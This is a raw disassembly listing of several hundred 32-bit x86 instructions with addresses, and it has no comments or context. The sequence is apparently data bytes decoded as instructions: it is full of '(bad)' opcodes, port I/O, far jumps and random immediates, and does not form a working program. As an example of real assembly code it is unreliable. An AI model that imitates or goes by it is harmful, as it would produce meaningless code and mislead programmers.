  40df1b:	sti    
  40df1c:	mov    al,0x8a
  40df1e:	dec    esi
  40df1f:	(bad)  [eax]
  40df21:	fcomp  QWORD PTR [ecx+0x708d1fc8]
  40df27:	retf   0x9a40
  40df2a:	inc    ecx
  40df2b:	cmp    dl,BYTE PTR [edx+eax*4]
  40df2e:	ins    BYTE PTR es:[edi],dx
  40df2f:	icebp  
  40df30:	ins    DWORD PTR es:[edi],dx
  40df31:	mov    esp,0x74bcb7b1
  40df36:	dec    esi
  40df37:	add    BYTE PTR [eax],ch
  40df39:	jl     0x40df82
  40df3b:	dec    esi
  40df3c:	imul   ecx,DWORD PTR [ecx+0x149884a9],0x146d9730
  40df46:	push   ds
  40df47:	add    al,0x9c
  40df49:	in     al,dx
  40df4a:	cwde   
  40df4b:	mov    esi,0x17086dff
  40df50:	outs   dx,BYTE PTR ds:[esi]
  40df51:	mov    edx,0x7da9068c
  40df56:	mov    esi,0x316e7f7e
  40df5b:	shr    DWORD PTR [edx+eiz*4-0x1292cfa],cl
  40df62:	or     dl,bl
  40df64:	lea    edi,[esi-0xf]
  40df67:	xchg   esi,eax
  40df68:	jl     0x40df04
  40df6a:	and    DWORD PTR [ecx-0x39],esp
  40df6d:	fsub   DWORD PTR [esi+edx*2+0x78ba96f6]
  40df74:	rcl    al,1
  40df76:	sbb    bl,ch
  40df78:	popa   
  40df79:	stos   BYTE PTR es:[edi],al
  40df7a:	mov    ebx,0xb81fbb84
  40df7f:	xor    al,0x7a
  40df81:	cli    
  40df82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df83:	ja     0x40df72
  40df85:	pop    ecx
  40df86:	ret    
  40df87:	jns    0x40dfed
  40df89:	sbb    DWORD PTR [esi+edx*4+0x7f6ba9ca],esi
  40df90:	add    al,0x8f
  40df92:	xchg   edi,eax
  40df93:	daa    
  40df94:	xor    DWORD PTR [edi+0x3d],edi
  40df97:	dec    esi
  40df98:	add    eax,0xf8c5a5c
  40df9d:	popf   
  40df9e:	pop    ebp
  40df9f:	fldcw  WORD PTR [edx]
  40dfa1:	fnstsw WORD PTR [esi-0x37]
  40dfa4:	xchg   esi,eax
  40dfa5:	cdq    
  40dfa6:	(bad)  
  40dfa7:	mov    esi,0xc95ac9ce
  40dfac:	jecxz  0x40e006
  40dfae:	or     al,0x4f
  40dfb0:	xchg   edx,eax
  40dfb1:	aad    0x91
  40dfb3:	test   eax,0x61793315
  40dfb8:	out    0x1f,eax
  40dfba:	retf   
  40dfbb:	dec    ecx
  40dfbc:	inc    edi
  40dfbd:	xchg   esp,eax
  40dfbe:	nop
  40dfbf:	jne    0x40e004
  40dfc1:	fwait
  40dfc2:	daa    
  40dfc3:	div    cl
  40dfc5:	add    DWORD PTR [edx],0xa22b8a75
  40dfcb:	pop    ecx
  40dfcc:	(bad)  
  40dfcd:	cmp    BYTE PTR [edx+0x2a3ebec6],bh
  40dfd3:	in     al,0x15
  40dfd5:	(bad)  
  40dfd6:	sbb    BYTE PTR [edx],cl
  40dfd8:	test   BYTE PTR [edx],0xd7
  40dfdb:	jge    0x40e006
  40dfdd:	push   esi
  40dfde:	pop    es
  40dfdf:	fstp   TBYTE PTR [ebx+0x21495dca]
  40dfe5:	sbb    BYTE PTR [esi-0x4477ca4a],al
  40dfeb:	dec    edx
  40dfec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfed:	and    eax,0xb80f2921
  40dff2:	push   0x42dfae7b
  40dff7:	je     0x40dfc5
  40dff9:	cwde   
  40dffa:	ss call 0xfa44:0x95c01788
  40e002:	arpl   di,cx
  40e004:	dec    esp
  40e005:	(bad)  
  40e006:	mov    bl,0xb4
  40e008:	push   ds
  40e009:	jmp    0x40e084
  40e00b:	mov    ds,WORD PTR [esi-0x34]
  40e00e:	xchg   esi,eax
  40e00f:	push   edi
  40e010:	or     eax,0x21a8324f
  40e015:	push   eax
  40e016:	cmc    
  40e017:	es cwde 
  40e019:	loop   0x40e089
  40e01b:	(bad)  
  40e01c:	cmp    al,0x97
  40e01e:	xor    BYTE PTR [eax],bl
  40e020:	inc    esp
  40e021:	dec    eax
  40e022:	sub    BYTE PTR [edi-0x2d],al
  40e025:	mov    dh,0x9f
  40e027:	pop    DWORD PTR [ebx+0x44]
  40e02a:	jmp    DWORD PTR [edi-0x2c]
  40e02d:	(bad)  
  40e02e:	adc    eax,0x54ec2e0a
  40e033:	mov    esi,0x84e133f8
  40e038:	sahf   
  40e039:	scas   al,BYTE PTR es:[edi]
  40e03a:	xchg   ebx,eax
  40e03b:	push   ebp
  40e03c:	add    BYTE PTR [eax-0x4b7ab49c],0xe
  40e043:	and    al,0x0
  40e045:	sub    eax,0xe45582e6
  40e04a:	push   edi
  40e04b:	(bad)  
  40e04c:	dec    edx
  40e04d:	(bad)  
  40e04e:	lods   al,BYTE PTR ds:[esi]
  40e04f:	pop    ebx
  40e050:	shl    BYTE PTR [eax-0x20d0442c],1
  40e056:	(bad)  [edx]
  40e058:	fisubr WORD PTR [esi-0x2]
  40e05b:	xor    DWORD PTR [ebp+edi*8-0x43],0x25566224
  40e063:	adc    eax,0x6bd9526f
  40e068:	test   edx,ebp
  40e06a:	sbb    cl,BYTE PTR [esp+ebp*2+0x65808c52]
  40e071:	mov    ds:0x3851f479,al
  40e076:	imul   al
  40e078:	mov    esi,DWORD PTR [ebx+0x2c]
  40e07b:	ds dec edi
  40e07d:	mov    edi,0xf024c9ac
  40e082:	sahf   
  40e083:	add    ecx,esp
  40e085:	mov    ds:0xd68d3e2c,eax
  40e08a:	cmp    eax,0x80bc20f9
  40e08f:	and    BYTE PTR [ebp+0x49],dh
  40e092:	adc    dl,ch
  40e094:	dec    edx
  40e095:	adc    dl,BYTE PTR [ebp-0x4f592708]
  40e09b:	add    DWORD PTR [edi-0x54eb76b6],esp
  40e0a1:	rol    DWORD PTR [eax+edx*8-0x63849fb1],0x3c
  40e0a9:	and    eax,0x61230547
  40e0ae:	xchg   ecx,eax
  40e0af:	jle    0x40e0e8
  40e0b1:	push   ebp
  40e0b2:	repnz add cl,ah
  40e0b5:	into   
  40e0b6:	sub    eax,0x4c78deb1
  40e0bb:	shr    DWORD PTR [edx+0x71],1
  40e0be:	sub    ch,BYTE PTR [edi+ebp*4-0x610a7031]
  40e0c5:	fwait
  40e0c6:	(bad)  
  40e0c7:	lods   al,BYTE PTR ds:[esi]
  40e0c8:	add    BYTE PTR [edi],dl
  40e0ca:	xor    ebx,edi
  40e0cc:	push   ss
  40e0cd:	mov    ch,0xad
  40e0cf:	loopne 0x40e0a0
  40e0d1:	ja     0x40e0bf
  40e0d3:	xchg   DWORD PTR ds:0x21aba33f,eax
  40e0d9:	loopne 0x40e0f4
  40e0db:	imul   esp,DWORD PTR [eax],0xffffff99
  40e0de:	out    dx,al
  40e0df:	push   0xd43de025
  40e0e4:	mov    dh,0xfb
  40e0e6:	sbb    ah,BYTE PTR [ecx]
  40e0e8:	scas   eax,DWORD PTR es:[edi]
  40e0e9:	xchg   ecx,eax
  40e0ea:	inc    ecx
  40e0eb:	adc    bl,bl
  40e0ed:	adc    BYTE PTR [edx+0x5edd2d9f],dl
  40e0f3:	push   ebp
  40e0f4:	jmp    0x60e9:0x35469a14
  40e0fb:	adc    DWORD PTR [edx],ebp
  40e0fd:	pop    ecx
  40e0fe:	inc    edx
  40e0ff:	lods   eax,DWORD PTR ds:[esi]
  40e100:	int3   
  40e101:	pusha  
  40e102:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e106:	sbb    BYTE PTR [edi],ah
  40e108:	xchg   esp,eax
  40e109:	pop    ss
  40e10a:	xor    BYTE PTR [edx+0x46],dl
  40e10d:	call   0x5514913
  40e112:	loopne 0x40e13b
  40e114:	xchg   ecx,eax
  40e115:	fidiv  WORD PTR [ebx]
  40e117:	or     eax,0x39c117de
  40e11c:	jns    0x40e119
  40e11e:	cwde   
  40e11f:	jo     0x40e0af
  40e121:	mov    al,0x65
  40e123:	rcl    DWORD PTR [edi],0xd3
  40e126:	and    BYTE PTR ds:0x41d38c6d,bh
  40e12c:	mov    ecx,0xd6699db6
  40e131:	mov    es,WORD PTR [ecx-0x5d2a78d2]
  40e137:	push   edx
  40e138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e139:	and    esp,0x6a7193fd
  40e13f:	adc    ebx,DWORD PTR [eax]
  40e141:	stos   BYTE PTR es:[edi],al
  40e142:	adc    al,0x40
  40e144:	jecxz  0x40e147
  40e146:	sub    eax,0x97a37ae8
  40e14b:	push   es
  40e14c:	xchg   edi,eax
  40e14d:	dec    esi
  40e14e:	addr16 jne 0x40e179
  40e151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e152:	sub    BYTE PTR [edx+0x52f2517d],bh
  40e158:	add    ch,bh
  40e15a:	sub    BYTE PTR [eax+0x50],0xc9
  40e15e:	or     DWORD PTR [edx+0x39],esi
  40e161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e162:	pop    ds
  40e163:	arpl   WORD PTR [edi-0x72e6476a],bp
  40e169:	in     eax,dx
  40e16a:	or     DWORD PTR [edx],ecx
  40e16c:	or     BYTE PTR [edi-0xf],bh
  40e16f:	ja     0x40e1da
  40e171:	enter  0xabc9,0x11
  40e175:	(bad)  
  40e176:	cwde   
  40e177:	pop    ds
  40e178:	xor    al,0x14
  40e17a:	dec    edx
  40e17b:	jmp    0xb70355e3
  40e180:	pop    edx
  40e181:	loopne 0x40e19e
  40e183:	sbb    eax,0x83c4bae2
  40e188:	inc    ecx
  40e189:	inc    esp
  40e18a:	pop    esp
  40e18b:	cwde   
  40e18c:	jge    0x40e1f1
  40e18e:	(bad)  
  40e18f:	and    ebp,edx
  40e191:	imul   esp,esp,0x99bc32fb
  40e197:	mov    dh,0xca
  40e199:	(bad)  
  40e19a:	add    ecx,DWORD PTR [edx-0x68]
  40e19d:	pusha  
  40e19e:	dec    esp
  40e19f:	fcomp  DWORD PTR [esi-0x5ef9c73a]
  40e1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a6:	xchg   ch,ch
  40e1a8:	dec    ecx
  40e1a9:	and    eax,0x86ec6e6f
  40e1ae:	ins    DWORD PTR es:[edi],dx
  40e1af:	subps  xmm7,XMMWORD PTR [ecx-0x6aaa2e22]
  40e1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b7:	test   DWORD PTR ds:0x481982ff,ebx
  40e1bd:	in     al,dx
  40e1be:	xchg   edi,eax
  40e1bf:	(bad)  
  40e1c0:	lods   eax,DWORD PTR ds:[esi]
  40e1c1:	and    eax,0x5aaf6cba
  40e1c6:	in     eax,dx
  40e1c7:	jno    0x40e204
  40e1c9:	jns    0x40e1f6
  40e1cb:	mov    DWORD PTR [ecx+0x4e16b5b4],esi
  40e1d1:	test   BYTE PTR ds:0x9f3df6bc,0x2e
  40e1d8:	hlt    
  40e1d9:	push   ebx
  40e1da:	imul   ebx,esp,0x78
  40e1dd:	mov    eax,edi
  40e1df:	jns    0x40e213
  40e1e1:	nop
  40e1e2:	add    DWORD PTR [ebx],edi
  40e1e4:	jb     0x40e239
  40e1e6:	jge    0x40e208
  40e1e8:	lock cwde 
  40e1ea:	pop    eax
  40e1eb:	ja     0x40e239
  40e1ed:	or     BYTE PTR [edx],cl
  40e1ef:	and    DWORD PTR [edi+0x3c1c7331],0x22
  40e1f6:	popf   
  40e1f7:	xchg   esi,eax
  40e1f8:	mov    esi,0x4dacd4e4
  40e1fd:	das    
  40e1fe:	and    ch,dh
  40e200:	jp     0x40e1b9
  40e202:	fmul   QWORD PTR [eax]
  40e204:	xor    BYTE PTR [ecx-0x1316d81b],bh
  40e20a:	pop    ds
  40e20b:	lahf   
  40e20c:	int3   
  40e20d:	cwde   
  40e20e:	leave  
  40e20f:	cdq    
  40e210:	pushw  es
  40e212:	daa    
  40e213:	out    0x17,al
  40e215:	sub    BYTE PTR [edi+0x3ec99c53],ch
  40e21b:	sbb    eax,0xbac9091a
  40e220:	ds cmp ebx,ebp
  40e223:	jl     0x40e226
  40e225:	imul   DWORD PTR [esi+0x2e20cb9c]
  40e22b:	push   ss
  40e22c:	rcr    DWORD PTR [ebx-0x3],0xae
  40e230:	pop    ebp
  40e231:	cmp    DWORD PTR [edi+0x4b],esi
  40e234:	outs   dx,BYTE PTR ds:[esi]
  40e235:	mov    dl,0xb5
  40e237:	adc    DWORD PTR [ebp+0x11],edi
  40e23a:	mov    esi,0xbdb18d9b
  40e23f:	add    BYTE PTR [esi+eax*2],al
  40e242:	xlat   BYTE PTR ds:[ebx]
  40e243:	sti    
  40e244:	(bad)  
  40e245:	jmp    0xeb28cce1
  40e24a:	pop    edi
  40e24b:	xor    eax,0xf0c8c859
  40e250:	dec    DWORD PTR [eax+edi*8-0x179e0fc4]
  40e257:	xlat   BYTE PTR ds:[ebx]
  40e258:	jmp    0x7078:0x6e7464ad
  40e25f:	iret   
  40e260:	out    dx,eax
  40e261:	mov    al,ds:0xea65a93
  40e266:	or     eax,0x180e001d
  40e26b:	in     al,dx
  40e26c:	jno    0x40e2ac
  40e26e:	mov    esp,0x3e56111c
  40e273:	mov    ebp,0xc0f6ba37
  40e278:	les    edi,FWORD PTR [eax+0x772c9960]
  40e27e:	cmp    edx,ecx
  40e280:	inc    edi
  40e281:	cmp    BYTE PTR [esi-0x6d741b8f],dh
  40e287:	mov    al,0x65
  40e289:	mov    al,0x76
  40e28b:	inc    ebp
  40e28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e28d:	pop    edx
  40e28e:	or     eax,0xa390092f
  40e293:	cld    
  40e294:	mov    edx,0x9bfa04b7
  40e299:	sbb    edx,DWORD PTR [edx+0xb2c6a0a]
  40e29f:	push   0x1a
  40e2a1:	popa   
  40e2a2:	push   ss
  40e2a3:	mov    WORD PTR [edi],ss
  40e2a5:	sbb    eax,0x1b060c78
  40e2aa:	rcl    bl,0xa1
  40e2ad:	adc    bl,ah
  40e2af:	add    DWORD PTR [eax-0x7cce6ac4],ebx
  40e2b5:	inc    eax
  40e2b6:	push   ebx
  40e2b7:	ror    al,1
  40e2b9:	or     ch,0xeb
  40e2bc:	pushf  
  40e2bd:	cmp    eax,0xac603791
  40e2c2:	js     0x40e2d5
  40e2c4:	mov    ch,BYTE PTR [ebx]
  40e2c6:	loope  0x40e2ed
  40e2c8:	mov    al,0x41
  40e2ca:	sub    BYTE PTR [eax+eiz*8+0x2c],bl
  40e2ce:	or     eax,0x6416bb4a
  40e2d3:	cmp    dl,al
  40e2d5:	xchg   ecx,eax
  40e2d6:	ficom  DWORD PTR [esi-0x1e]
  40e2d9:	or     DWORD PTR [edi],ecx
  40e2db:	out    dx,eax
  40e2dc:	push   edx
  40e2dd:	bound  esi,QWORD PTR [edi-0x1c]
  40e2e0:	in     al,0x27
  40e2e2:	pop    es
  40e2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2e4:	push   edi
  40e2e5:	xor    al,0x4c
  40e2e7:	sub    cl,BYTE PTR [ebx+0x79]
  40e2ea:	jmp    0x9c4c2f9d
  40e2ef:	in     eax,0xcc
  40e2f1:	jbe    0x40e323
  40e2f3:	iret   
  40e2f4:	(bad)  
  40e2f5:	stos   BYTE PTR es:[edi],al
  40e2f6:	sub    ebp,esi
  40e2f8:	cdq    
  40e2f9:	push   edi
  40e2fa:	imul   esp,DWORD PTR [ebx],0xfffffffd
  40e2fd:	lahf   
  40e2fe:	out    dx,eax
  40e2ff:	sub    eax,0xaf17165
  40e304:	ror    DWORD PTR ds:0x22b97cf2,1
  40e30a:	loop   0x40e37c
  40e30c:	inc    ebp
  40e30d:	test   DWORD PTR [edi+0x10471113],0x48858060
  40e317:	pop    ds
  40e318:	out    0xc9,al
  40e31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e31b:	mov    bh,0xd
  40e31d:	pop    esp
  40e31e:	dec    eax
  40e31f:	jae    0x40e37f
  40e321:	add    esi,DWORD PTR [edx+0x5ea34c5d]
  40e327:	jae    0x40e301
  40e329:	mov    edi,0xcd2570aa
  40e32e:	das    
  40e32f:	pop    ss
  40e330:	jmp    0x569d5ef1
  40e335:	or     cl,dl
  40e337:	mov    ebx,DWORD PTR [eax+eax*2+0x38]
  40e33b:	pop    ebx
  40e33c:	ret    0x25bf
  40e33f:	inc    ebx
  40e340:	cmp    DWORD PTR [eax],edx
  40e342:	test   DWORD PTR ds:0x70ec86dc,0xbe7b1c8b
  40e34c:	mov    cs,WORD PTR es:[ecx]
  40e34f:	clc    
  40e350:	xor    BYTE PTR [eax],bh
  40e352:	and    al,0xa2
  40e354:	adc    ah,ch
  40e356:	sub    eax,0x68e32c18
  40e35b:	js     0x40e3c5
  40e35d:	sub    DWORD PTR [edi+0x3677a0de],0x15fec052
  40e367:	out    dx,eax
  40e368:	cmp    dh,dl
  40e36a:	inc    ebx
  40e36b:	sbb    eax,0x18417037
  40e370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e371:	mov    al,0x7
  40e373:	sbb    al,0xc
  40e375:	iret   
  40e376:	mov    ds:0xf4d5b1b7,al
  40e37b:	shr    edi,cl
  40e37d:	mov    eax,ds:0x74c5da3d
  40e382:	fsubr  QWORD PTR [edi-0x776ecf20]
  40e388:	add    al,0x86
  40e38a:	jb     0x40e32c
  40e38c:	push   0x3e08e58f
  40e391:	call   0xb457:0x737a38e7
  40e398:	and    ebp,DWORD PTR [esi+0x4a]
  40e39b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e39c:	dec    edx
  40e39d:	mov    bh,0x9d
  40e39f:	jns    0x40e3ce
  40e3a1:	pop    edi
  40e3a2:	in     eax,0xce
  40e3a4:	jl     0x40e3ed
  40e3a6:	ror    BYTE PTR [edi+0x1c],0x8d
  40e3aa:	push   esi
  40e3ab:	daa    
  40e3ac:	aam    0x11
  40e3ae:	xchg   BYTE PTR [esi+0x36ba5037],ch
  40e3b4:	mov    ebp,DWORD PTR [ecx-0x65]
  40e3b7:	fsubr  DWORD PTR [eax+ebx*1-0x9]
  40e3bb:	jle    0x40e3e7
  40e3bd:	sbb    DWORD PTR [edx],edi
  40e3bf:	jmp    DWORD PTR [eax+edi*2-0x4c]
  40e3c3:	lea    esi,[ebp-0x79]
  40e3c6:	dec    ecx
  40e3c7:	outs   dx,BYTE PTR fs:[esi]
  40e3c9:	mov    dh,BYTE PTR [esi]
  40e3cb:	push   ecx
  40e3cc:	jg     0x40e411
  40e3ce:	fnstsw WORD PTR [ebx-0x3f]
  40e3d1:	cmp    dl,BYTE PTR [eax+0x77b7eb53]
  40e3d7:	sub    ah,BYTE PTR [edx+0x46]
  40e3da:	and    eax,0x47e70f0a
  40e3df:	sbb    ebx,DWORD PTR [esi]
  40e3e1:	and    DWORD PTR [ecx],esi
  40e3e3:	int    0x3
  40e3e5:	popa   
  40e3e6:	add    eax,0xf92d5dc
  40e3eb:	inc    esp
  40e3ec:	mov    cl,0x22
  40e3ee:	mov    BYTE PTR [ebx+0x19],bh
  40e3f1:	push   esp
  40e3f2:	jle    0x40e45c
  40e3f4:	inc    ecx
  40e3f5:	test   eax,0x7f73fc3d
  40e3fa:	iret   
  40e3fb:	xchg   edi,eax
  40e3fc:	push   edi
  40e3fd:	lds    esi,FWORD PTR [ebx]
  40e3ff:	aas    
  40e400:	cmp    BYTE PTR [ebx-0x4cb7560a],bl
  40e406:	mov    edx,0x40865bff
  40e40b:	nop
  40e40c:	(bad)  
  40e40d:	sbb    esp,ebp
  40e40f:	cmp    ch,al
  40e411:	jae    0x40e46b
  40e413:	repz sahf 
  40e415:	mov    ebp,0x34d03b9d
  40e41a:	adc    cl,ch
  40e41c:	sahf   
  40e41d:	popf   
  40e41e:	stos   DWORD PTR es:[edi],eax
  40e41f:	pop    edx
  40e420:	in     eax,dx
  40e421:	xchg   eax,edi
  40e423:	adc    eax,0x2ef637b2
  40e428:	adc    al,0xd2
  40e42a:	pop    es
  40e42b:	pop    ds
  40e42c:	jb     0x40e44a
  40e42e:	inc    eax
  40e42f:	sub    ch,al
  40e431:	fistp  DWORD PTR [ebx]
  40e433:	in     eax,dx
  40e434:	xlat   BYTE PTR ds:[ebx]
  40e435:	pop    es
  40e436:	mov    edi,0x5b76692f
  40e43b:	std    
  40e43c:	sar    BYTE PTR [esi+0x79],1
  40e43f:	repz iret 
  40e441:	jae    0x40e40c
  40e443:	xor    ebp,DWORD PTR [edx]
  40e445:	mov    dl,0x8e
  40e447:	inc    esi
  40e448:	int3   
  40e449:	jae    0x40e429
  40e44b:	add    ah,BYTE PTR [eax-0x57dd1b00]
  40e451:	les    eax,FWORD PTR [ecx]
  40e453:	xor    edx,esp
  40e455:	dec    esp
  40e456:	push   ecx
  40e457:	mov    bh,0x44
  40e459:	sub    al,0xf2
  40e45b:	jp     0x40e44a
  40e45d:	out    dx,eax
  40e45e:	xor    eax,0x253ea59f
  40e463:	push   edx
  40e464:	jmp    0x5049:0x9c99a2b0
  40e46b:	push   0xffffffab
  40e46d:	cwde   
  40e46e:	and    esp,ebx
  40e470:	aas    
  40e471:	or     edi,DWORD PTR [ecx]
  40e473:	adc    al,0x8b
  40e475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e476:	lods   eax,DWORD PTR ds:[esi]
  40e477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e478:	sti    
  40e479:	or     al,0xa2
  40e47b:	mov    edx,0x66b883fb
  40e480:	outs   dx,BYTE PTR ds:[esi]
  40e481:	pop    ebx
  40e482:	jecxz  0x40e453
  40e484:	enter  0x61ce,0xb4
  40e488:	retf   0x8c35
  40e48b:	fcomp  DWORD PTR [ecx]
  40e48d:	in     eax,dx
  40e48e:	outs   dx,DWORD PTR ds:[esi]
  40e48f:	out    0xa1,eax
  40e491:	call   0xd751ddab
  40e496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e497:	test   DWORD PTR [esi],edx
  40e499:	test   eax,0x11cee9c7
  40e49e:	or     ch,0x3c
  40e4a1:	imul   esp,DWORD PTR [esi],0x247671de
  40e4a7:	mov    edi,0x4280cc32
  40e4ac:	mov    BYTE PTR [edi+0xcedbb4d],al
  40e4b2:	out    0x1c,al
  40e4b4:	sbb    eax,0x9e650013
  40e4b9:	out    dx,al
  40e4ba:	inc    eax
  40e4bb:	xor    ebx,DWORD PTR [esi-0x3967bc70]
  40e4c1:	sbb    al,0x1e
  40e4c3:	jae    0x40e461
  40e4c5:	mov    bh,0x90
  40e4c7:	mov    bh,0xc2
  40e4c9:	lock sbb al,BYTE PTR [edx-0x20]
  40e4cd:	xor    bl,BYTE PTR [edi+0x41]
  40e4d0:	mov    dl,0x3e
  40e4d2:	pop    edi
  40e4d3:	int    0xda
  40e4d5:	sub    eax,0x258101c5
  40e4da:	or     BYTE PTR [ecx+0x64],0xdb
  40e4de:	pop    ecx
  40e4df:	shr    cl,cl
  40e4e1:	xor    al,0x53
  40e4e3:	jmp    0xeda9:0xa3174a52
  40e4ea:	xor    BYTE PTR cs:[ebx],bl
  40e4ed:	mov    esp,0x927e66f8
  40e4f2:	fcomp  st(7)
  40e4f4:	sbb    DWORD PTR [eax],ebp
  40e4f6:	cmp    al,0x5d
  40e4f8:	pop    edi
  40e4f9:	ror    ah,1
  40e4fb:	mov    esi,0x7c583b7e
  40e500:	loope  0x40e4a9
  40e502:	fdivr  st(1),st
  40e505:	push   ss
  40e506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e507:	or     bh,BYTE PTR [ebx-0x60]
  40e50a:	cmp    edx,DWORD PTR [esi]
  40e50c:	mov    ebx,0x70229640
  40e511:	cld    
  40e512:	sub    al,0x74
  40e514:	xchg   esp,eax
  40e515:	sbb    eax,0x11ee98df
  40e51a:	rcl    DWORD PTR [edi],1
  40e51c:	daa    
  40e51d:	sbb    ah,dh
  40e51f:	xchg   esi,eax
  40e520:	loopne 0x40e581
  40e522:	mov    ah,0xaa
  40e524:	dec    edi
  40e525:	pusha  
  40e526:	imul   ebx,esp,0x931c0eea
  40e52c:	sar    DWORD PTR [edx-0x669d66a1],0x6d
  40e533:	inc    esp
  40e534:	aad    0x10
  40e536:	push   esi
  40e537:	idiv   edi
  40e539:	add    al,0xc9
  40e53b:	cmp    eax,0xef48d6af
  40e540:	es ror edx,cl
  40e543:	ins    BYTE PTR es:[edi],dx
  40e544:	jae    0x40e51c
  40e546:	pusha  
  40e547:	mov    ch,0xcf
  40e549:	(bad)
  40e54c:	mov    ch,BYTE PTR ds:0xe8599a2c
  40e552:	adc    ebp,ebp
  40e554:	ds fnsetpm(287 only) 
  40e557:	retf   
  40e558:	cmp    DWORD PTR [esi-0x42e25214],esp
  40e55e:	mov    DWORD PTR [ebp-0x30],esp
  40e561:	(bad)  
  40e562:	jbe    0x40e4f1
  40e564:	add    ch,BYTE PTR [ebp-0x62]
  40e567:	mov    eax,0x161a1762
  40e56c:	dec    edx
  40e56d:	cmp    eax,DWORD PTR gs:[eax-0x6f7120df]
  40e574:	jle    0x40e53f
  40e576:	mov    WORD PTR [esi+0x66],gs
  40e579:	outs   dx,BYTE PTR ds:[esi]
  40e57a:	lods   al,BYTE PTR ds:[esi]
  40e57b:	or     BYTE PTR [esi],bh
  40e57d:	fcomi  st,st(7)
  40e57f:	mov    ah,0x71
  40e581:	inc    edi
  40e582:	and    eax,0x9a1b434f
  40e587:	call   DWORD PTR [esi]
  40e589:	enter  0xc348,0xde
  40e58d:	push   esp
  40e58e:	(bad)  
  40e58f:	or     eax,0xc71011ce
  40e594:	pushf  
  40e595:	sub    DWORD PTR [ebp-0x47],ebp
  40e598:	push   0xeefa5d98
  40e59d:	xor    cl,BYTE PTR [ebx]
  40e59f:	mov    eax,0xad3d4c7e
  40e5a4:	mov    ds:0xf0b27597,eax
  40e5a9:	jg     0x40e5a6
  40e5ab:	pop    esp
  40e5ac:	lds    edi,FWORD PTR [eax+ecx*2-0x4473687b]
  40e5b3:	imul   esp,DWORD PTR ds:0x174109f,0xff41d86f
  40e5bd:	test   DWORD PTR [esi-0xa],eax
  40e5c0:	cmc    
  40e5c1:	inc    BYTE PTR [ecx+0x27a4a77]
  40e5c7:	jnp    0x40e5a2
  40e5c9:	lock inc eax
  40e5cb:	addr16 mov bl,0x64
  40e5ce:	mov    BYTE PTR [edi+0x5677fd37],cl
  40e5d4:	outs   dx,DWORD PTR ds:[esi]
  40e5d5:	adc    ebx,DWORD PTR [esi+0x74dfb9df]
  40e5db:	fucomi st,st(5)
  40e5dd:	sub    edx,DWORD PTR [edx-0x28e990a3]
  40e5e3:	xchg   edi,eax
  40e5e4:	sbb    dl,BYTE PTR [edi]
  40e5e6:	pop    edi
  40e5e7:	loope  0x40e5e6
  40e5e9:	out    dx,al
  40e5ea:	imul   ebx,DWORD PTR [ebp-0x28],0x5f
  40e5ee:	xchg   esp,eax
  40e5ef:	aam    0x49
  40e5f1:	mov    ebx,0x91c8e4da
  40e5f6:	mov    eax,ds:0x9300103
  40e5fb:	add    al,0x9e
  40e5fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5fe:	add    eax,0x924467c
  40e603:	shr    DWORD PTR [esi-0x7b],1
  40e606:	rcr    eax,1
  40e608:	mov    al,ds:0x861f65f3
  40e60d:	adc    BYTE PTR [ebx],cl
  40e60f:	call   0x1beb8f7d
  40e614:	push   es
  40e615:	test   al,0xe
  40e617:	stc    
  40e618:	push   edi
  40e619:	scas   al,BYTE PTR es:[edi]
  40e61a:	or     ebx,DWORD PTR [ecx+0x16]
  40e61d:	and    DWORD PTR [esi-0x708dae56],esp
  40e623:	fwait
  40e624:	or     bl,BYTE PTR [edi+0x32]
  40e627:	jg     0x40e612
  40e629:	pop    esp
  40e62a:	cmp    eax,0xb050f8c3
  40e62f:	sub    DWORD PTR [ebp+0x761a34da],edi
  40e635:	pop    ss
  40e636:	cmp    ch,BYTE PTR [edi]
  40e638:	and    eax,0xc0cb85e7
  40e63d:	sbb    BYTE PTR [edi-0x31],dh
  40e640:	js     0x40e67d
  40e642:	xchg   ecx,eax
  40e643:	aas    
  40e644:	mov    DWORD PTR ds:0x60bf153d,ebp
  40e64a:	sub    al,0x21
  40e64c:	xor    edx,DWORD PTR [esi+ebp*8+0x1c21ac8]
  40e653:	cmp    eax,0xdf7e2dd7
  40e658:	sbb    ah,BYTE PTR [edi-0x79]
  40e65b:	adc    eax,DWORD PTR [edx+ecx*4]
  40e65e:	inc    eax
  40e65f:	lds    ebx,FWORD PTR [edx]
  40e661:	shl    DWORD PTR [ecx-0x79d05699],cl
  40e667:	nop
  40e668:	fstp   DWORD PTR [edx+ebp*1]
  40e66b:	mov    edi,0x2b9a9d8a
  40e670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e671:	dec    ebx
  40e672:	ds (bad) 
  40e674:	jmp    0x40e643
  40e676:	in     eax,dx
  40e677:	pop    edi
  40e678:	jns    0x40e678
  40e67a:	adc    cl,ch
  40e67c:	or     BYTE PTR [ebp+0x75],bh
  40e67f:	cld    
  40e680:	pop    ds
  40e681:	jle    0x40e6ab
  40e683:	ror    edx,1
  40e685:	xor    ebp,DWORD PTR [ecx+0x62]
  40e688:	jl     0x40e631
  40e68a:	fidivr WORD PTR ds:0x12b99c41
  40e690:	popa   
  40e691:	jle    0x40e70e
  40e693:	sbb    al,0xe2
  40e695:	jno    0x40e6f5
  40e697:	scas   eax,DWORD PTR es:[edi]
  40e698:	das    
